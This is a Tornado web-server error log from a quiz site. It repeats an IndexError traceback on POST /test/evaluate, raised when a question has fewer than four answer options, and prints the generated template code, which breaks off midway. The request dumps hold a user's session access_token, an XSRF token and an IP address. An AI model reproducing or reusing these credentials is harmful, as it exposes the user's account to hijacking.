HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c422b8e4c854816f48747&answers=%5B3%5D&cursor=2&_xsrf=ca70047eadb44c81b350d5c75c60677b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '31.153.125.1', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFGNFI0YlNpZFF5c2t4QjJhMUxuTVVNRFNQMWtsNm9GalNIb3hCS1R4ZFpDaXIyakJJWDJ3dHFObjhSS0dNSGJ2ZDJnZFpDVHl6cEdpYnNHeUhzOVdxMWtGaFpBQVpEWkQ=|1348223239|43a45cb3a1bd1d828740e17ee66847a8031f9b92"; _xsrf=ca70047eadb44c81b350d5c75c60677b; __utma=188782963.1111671842.1348223143.1348223143.1348223143.1; __utmb=188782963.8.10.1348223143; __utmc=188782963; __utmz=188782963.1348223143.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 50.54ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c422b8e4c854816f48747&answers=%5B0%5D&cursor=5&_xsrf=ca70047eadb44c81b350d5c75c60677b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '31.153.125.1', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFGNFI0YlNpZFF5c2t4QjJhMUxuTVVNRFNQMWtsNm9GalNIb3hCS1R4ZFpDaXIyakJJWDJ3dHFObjhSS0dNSGJ2ZDJnZFpDVHl6cEdpYnNHeUhzOVdxMWtGaFpBQVpEWkQ=|1348223239|43a45cb3a1bd1d828740e17ee66847a8031f9b92"; _xsrf=ca70047eadb44c81b350d5c75c60677b; __utma=188782963.1111671842.1348223143.1348223143.1348223143.1; __utmb=188782963.8.10.1348223143; __utmc=188782963; __utmz=188782963.1348223143.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 46.35ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c422b8e4c854816f48747&answers=%5B3%5D&cursor=11&_xsrf=ca70047eadb44c81b350d5c75c60677b', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '31.153.125.1', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFGNFI0YlNpZFF5c2t4QjJhMUxuTVVNRFNQMWtsNm9GalNIb3hCS1R4ZFpDaXIyakJJWDJ3dHFObjhSS0dNSGJ2ZDJnZFpDVHl6cEdpYnNHeUhzOVdxMWtGaFpBQVpEWkQ=|1348223239|43a45cb3a1bd1d828740e17ee66847a8031f9b92"; _xsrf=ca70047eadb44c81b350d5c75c60677b; __utma=188782963.1111671842.1348223143.1348223143.1348223143.1; __utmb=188782963.8.10.1348223143; __utmc=188782963; __utmz=188782963.1348223143.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 50.02ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
